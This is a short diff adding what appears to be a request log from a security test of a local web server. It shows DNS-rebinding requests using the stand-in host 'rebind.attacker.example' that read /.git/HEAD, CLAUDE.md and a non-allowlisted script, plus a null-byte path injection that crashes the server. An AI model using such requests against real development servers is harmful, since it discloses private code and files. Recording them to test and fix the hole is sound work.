@@ -1,0 +1,4 @@
+{"req":"GET /.git/HEAD Host: rebind.attacker.example","status":200,"first":"ref: refs/heads/ccr-82845698-yw5n79 "}
+{"req":"GET /CLAUDE.md Host: rebind.attacker.example","status":200,"first":"# CLAUDE.md — Portal DIVAT (Cadastro de "}
+{"req":"GET /scripts/check_grants.mjs (not in .vercelignore allowlist)","status":200,"first":"// check_grants.mjs — Checagem VIVA da p"}
+{"uncaughtException":"ERR_INVALID_ARG_VALUE","msg":"The argument 'path' must be a string, Uint8Array, or URL without null bytes. Received '/home/user/DETRO-Banco-de-Dados/\\"}
